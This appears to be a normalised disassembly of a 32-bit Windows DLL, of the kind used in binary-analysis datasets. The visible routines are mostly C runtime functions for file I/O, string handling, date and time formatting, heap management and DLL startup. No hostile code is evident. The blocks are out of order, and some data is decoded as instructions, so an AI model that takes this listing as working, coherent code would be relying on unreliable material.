cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_1000c60c
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_1000a190
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_10007fcf
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_100088e4
push esi
call sub_10008000
push esi
mov edi eax
call sub_10008936
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_10008000
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_1000c983
push esi
mov edi eax
call sub_1000c92a
push [ esi + 0x10 ]
call sub_1000c84a
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_10008d46
and [ esi + 0x1c ] 0x0
pop ecx
sub_1000804c
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_100088e4
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10008078
push [ ebp + 0x8 ]
mov esi eax
call sub_10008936
add esp 0x14
mov eax esi
pop esi
pop ebp
retn
sub_10008078
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1000a5cf
mov [ eax ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_1000c983
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_1000cb64
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_1000ca8c
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp r-xdata
test al 0x8
je r-xdata
pop edi
pop esi
retn
test ah 0x4
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_10008105
push esi
call sub_1000ce35
mov esi eax
test esi esi
jne r-xdata
push edi
push esi
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call sub_1000ccc5
push esi
mov edi eax
call sub_10008936
add esp 0x14
mov eax edi
pop edi
pop esi
retn
pop esi
retn
sub_10008149
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_100088e4
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10008178
push [ ebp + 0x14 ]
mov esi eax
call sub_10008936
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_10008178
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_1000b81a
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_1000c983
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_1000a190
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_1000cefd
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_10008282
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100082df
add esp 0xc
mov [ ebp + 0x10 ] eax
test ebx ebx
je r-xdata
push esi
call edi
push 0x13
call sub_1000b7a4
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_1000b805
pop ecx
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100082df
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
xor edi edi
cmp esi ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
push ebx
push 0xffffffff
push [ ebp + 0xc ]
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0xc ]
call sub_10007b94
pop ecx
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
call sub_1000a5cf
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ rw-data ] 0x1
jne r-xdata
cmp edx ebx
jbe r-xdata
dec eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edi [ WideCharToMultiByte@IAT ]
push eax
push ebx
push edx
push esi
push 0xffffffff
push [ ebp + 0xc ]
push 0x220
push [ rw-data ]
call edi
mov esi eax
cmp esi ebx
je r-xdata
cmp edx ebx
jbe r-xdata
mov eax edi
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
push edx
push esi
push edx
push [ ebp + 0xc ]
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
push edx
push [ ebp + 0xc ]
call sub_1000848e
pop ecx
mov [ ebp + 0x10 ] eax
pop ecx
mov edx eax
mov al [ ecx ]
mov [ edi + esi ] al
mov ax [ ecx ]
inc ecx
inc ecx
test ax ax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea eax [ esi - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
inc edi
cmp edi edx
jb r-xdata
cmp esi [ ebp + 0x10 ]
jae r-xdata
cmp [ eax + esi - 0x1 ] bl
jne r-xdata
cmp [ ecx ] 0xff
ja r-xdata
mov eax esi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ rw-data ]
lea eax [ ebp - 0x2 ]
push eax
push 0x1
push [ ebp + 0xc ]
push ebx
push [ rw-data ]
call edi
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
lea ecx [ eax + esi ]
cmp ecx [ ebp + 0x10 ]
ja r-xdata
xor edx edx
cmp eax ebx
jle r-xdata
add [ ebp + 0xc ] 0x2
jmp r-xdata
mov cl [ ebp + edx - 0x2 ]
mov eax [ ebp + 0x8 ]
cmp cl bl
mov [ esi + eax ] cl
je r-xdata
inc edx
inc esi
cmp edx [ ebp - 0xc ]
jl r-xdata
sub_1000848e
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor edx edx
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
pop ebp
retn
cmp [ eax ] dx
je r-xdata
cmp ecx edx
je r-xdata
inc eax
inc eax
dec ecx
jne r-xdata
cmp [ eax ] dx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
inc eax
pop ebp
retn
sub_100084bd
push esi
mov esi ecx
push 0x1b
mov [ esi ] r--data
call sub_1000b7a4
mov esi [ esi + 0x4 ]
pop ecx
test esi esi
je r-xdata
push 0x1b
call sub_1000b805
pop ecx
pop esi
retn
push esi
call sub_10008d46
pop ecx
sub_10008510
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov edi [ esp + 0x8 ]
push esi
test edi 0x3
push ebx
je r-xdata
mov eax [ edi ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add edi 0x4
test eax 0x81010100
je r-xdata
mov al [ edi ]
inc edi
test al al
je r-xdata
mov eax [ edi - 0x4 ]
test al al
je r-xdata
dec edi
jmp r-xdata
test edi 0x3
jne r-xdata
sub edi 0x4
test ah ah
je r-xdata
mov esi [ esp + 0x14 ]
test esi 0x3
jne r-xdata
mov dl [ esi ]
inc esi
test dl dl
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
sub edi 0x3
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
mov [ edi ] dl
inc edi
dec ecx
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
sub edi 0x2
jmp r-xdata
test eax 0xff000000
jne r-xdata
mov [ edi ] cl
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov ecx ebx
and ecx 0x3
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
test dh dh
je r-xdata
mov dl [ esi ]
inc esi
mov [ edi ] dl
inc edi
test dl dl
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edx 0xff0000
je r-xdata
pop ebx
pop esi
dec ecx
jne r-xdata
mov [ edi ] dx
xor edx edx
mov eax [ esp + 0x10 ]
mov [ edi + 0x2 ] dl
pop ebx
pop esi
pop edi
retn
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
sub_10008650
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_1000870c
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_10008748
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_1000750a
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_100074c8
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_1000750a
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_1000759e
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_10008828
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1000c32b
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_1000c32b
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_10008c87
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_100088e4
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_1000b7a4
pop ecx
retn
sub_10008913
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_1000b7a4
pop ecx
retn
sub_10008936
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_1000b805
pop ecx
retn
sub_10008965
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_1000b805
pop ecx
retn
sub_10008988
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push esi
call sub_100088e4
push esi
call sub_1000c13c
mov edi eax
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x20 ]
push esi
call sub_1000b932
push esi
push edi
mov ebx eax
call sub_1000c1c9
push esi
call sub_10008936
add esp 0x20
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_100089c4
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
lea eax [ ebp - 0x14 ]
push edi
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x14 ]
push 0x64
cdq
pop ecx
idiv ecx
movzx edi [ ebp - 0x12 ]
push 0xa
mov eax edi
pop esi
mov ecx [ ebp + 0x8 ]
mov ebx esi
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x5 ] 0x2f
mov [ ecx + 0x2 ] 0x2f
mov [ ebp - 0x4 ] edx
cdq
idiv ebx
mov bl 0x30
add al bl
mov [ ecx ] al
mov eax edi
cdq
mov edi esi
idiv edi
movzx eax [ ebp - 0xe ]
add dl bl
mov [ ecx + 0x1 ] dl
cdq
idiv edi
add al bl
mov [ ecx + 0x3 ] al
movzx eax [ ebp - 0xe ]
cdq
idiv edi
mov eax [ ebp - 0x4 ]
add dl bl
mov [ ecx + 0x4 ] dl
cdq
idiv edi
pop edi
add al bl
mov [ ecx + 0x6 ] al
mov eax [ ebp - 0x4 ]
cdq
idiv esi
pop esi
mov eax ecx
add dl bl
pop ebx
mov [ ecx + 0x7 ] dl
leave
retn
sub_10008a48
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
call [ GetLocalTime@IAT ]
movzx edi [ ebp - 0x8 ]
push 0xa
mov eax edi
pop esi
mov ecx [ ebp + 0x8 ]
cdq
mov ebx esi
and [ ecx + 0x8 ] 0x0
idiv ebx
mov bl 0x30
mov [ ecx + 0x5 ] 0x3a
mov [ ecx + 0x2 ] 0x3a
add al bl
mov [ ecx ] al
mov eax edi
cdq
mov edi esi
idiv edi
movzx eax [ ebp - 0x6 ]
add dl bl
mov [ ecx + 0x1 ] dl
cdq
idiv edi
add al bl
mov [ ecx + 0x3 ] al
movzx eax [ ebp - 0x6 ]
cdq
idiv edi
movzx eax [ ebp - 0x4 ]
add dl bl
mov [ ecx + 0x4 ] dl
cdq
idiv edi
pop edi
add al bl
mov [ ecx + 0x6 ] al
movzx eax [ ebp - 0x4 ]
cdq
idiv esi
pop esi
mov eax ecx
add dl bl
pop ebx
mov [ ecx + 0x7 ] dl
leave
retn
sub_10008ac1
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] 0x42
push eax
call sub_1000b932
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1000b81a
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_10008b11
mov eax [ esp + 0x8 ]
cmp eax 0x1
jne r-xdata
xor ecx ecx
cmp eax ecx
jne r-xdata
call [ GetVersion@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_1000d8a1
test eax eax
pop ecx
je r-xdata
cmp eax 0x3
jne r-xdata
cmp [ rw-data ] ecx
jle r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
xor ecx ecx
mov cl [ rw-data ]
and eax 0xff
shr [ rw-data ] 0x10
mov [ rw-data ] eax
mov [ rw-data ] ecx
shl eax 0x8
add eax ecx
mov [ rw-data ] eax
call sub_1000b18c
test eax eax
jne r-xdata
push 0x1
pop eax
push ecx
call sub_1000b278
pop ecx
dec [ rw-data ]
cmp [ rw-data ] ecx
jne r-xdata
retn 0xc
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1000d76f
mov [ rw-data ] eax
call sub_1000d1d8
call sub_1000d522
call sub_1000d469
call sub_1000a803
inc [ rw-data ]
jmp r-xdata
call sub_1000d8dd
call sub_1000d394
call sub_1000b1e0
call sub_1000d8dd
jmp r-xdata
call sub_1000a841
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10008b11
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10005710
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10008b11
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10008b11
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10008c87
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
call sub_1000d952
test eax eax
jne r-xdata
push [ esp + 0x4 ]
call sub_1000d98b
push 0xff
call [ rw-data ]
pop ecx
pop ecx
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_10008ccc
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_10008cf8
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_1000dade
test eax eax
pop ecx
jne r-xdata
sub_10008cf8
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
push edi
ja r-xdata
test esi esi
jne r-xdata
push 0x9
call sub_1000b7a4
push esi
call sub_1000de8d
push 0x9
mov edi eax
call sub_1000b805
add esp 0xc
test edi edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_10008d46
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x9
call sub_1000b7a4
push esi
call sub_1000db37
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_1000b805
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push esi
push eax
call sub_1000db62
push 0x9
call sub_1000b805
add esp 0xc
pop esi
retn
sub_10008daf
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push edi
push 0x19
call sub_1000b7a4
pop ecx
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e640
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp + 0xc ] eax
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je r-xdata
pop esi
pop ebp
retn
inc ecx
test dl dl
jne r-xdata
mov esi ecx
test esi esi
jmp r-xdata
movzx edi dl
shl eax 0x8
or eax edi
cmp [ ebp + 0xc ] eax
jne r-xdata
mov dl [ ecx ]
movzx eax dl
movzx edi al
test [ edi + rw-data ] 0x4
je r-xdata
push 0x19
call sub_1000b805
pop ecx
mov eax esi
pop edi
jne r-xdata
lea esi [ ecx - 0x1 ]
jmp r-xdata
sub_10008e21
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
push edi
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1000e667
pop ecx
pop ecx
cmp [ ebx ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp + 0x10 ]
push ebx
call [ GetFullPathNameA@IAT ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
push 0x104
call sub_10008cba
mov edi eax
pop ecx
test edi edi
jne r-xdata
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp + 0x10 ] 0x104
call sub_1000a5cf
mov [ eax ] 0xc
jmp r-xdata
mov eax edi
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
call sub_1000a5cf
mov [ eax ] 0x22
jmp r-xdata
push edi
call sub_10008d46
pop ecx
xor eax eax
jmp r-xdata
pop edi
pop ebx
pop ebp
retn
call [ GetLastError@IAT ]
push eax
call sub_1000a55c
pop ecx
push edi
call sub_10008d46
pop ecx
sub_10008ec6
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push ebx
call sub_1000e840
cmp eax 0x1
pop ecx
jb r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x1 ] 0x3a
jne r-xdata
and [ ebp + 0xc ] 0x0
cmp [ ebx ] 0x0
mov eax ebx
mov esi 0xff
mov [ ebp + 0x8 ] eax
je r-xdata
and [ eax ] 0x0
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov cl [ eax ]
movzx edx cl
test [ edx + rw-data ] 0x4
je r-xdata
inc ebx
inc ebx
jmp r-xdata
push 0x2
push ebx
push esi
call sub_1000e79a
add esp 0xc
and [ esi + 0x2 ] 0x0
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
and [ ecx ] 0x0
cmp cl 0x2f
je r-xdata
inc eax
jmp r-xdata
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
cmp edi ebx
jb r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp + 0xc ] ecx
cmp cl 0x5c
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
sub eax ebx
cmp eax esi
jae r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
test edi edi
je r-xdata
cmp cl 0x2e
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ eax ] 0x0
push esi
push ebx
push edi
call sub_1000e79a
add esp 0xc
and [ esi + edi ] 0x0
mov esi eax
mov edi [ ebp + 0x18 ]
test edi edi
je r-xdata
sub edi ebx
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax [ ebp - 0x4 ]
cmp eax esi
jae r-xdata
push edi
push ebx
push [ ebp + 0x14 ]
call sub_1000e79a
mov eax [ ebp + 0x14 ]
add esp 0xc
and [ edi + eax ] 0x0
mov eax [ ebp + 0x8 ]
mov edi esi
mov ebx [ ebp + 0xc ]
jmp r-xdata
sub edi ebx
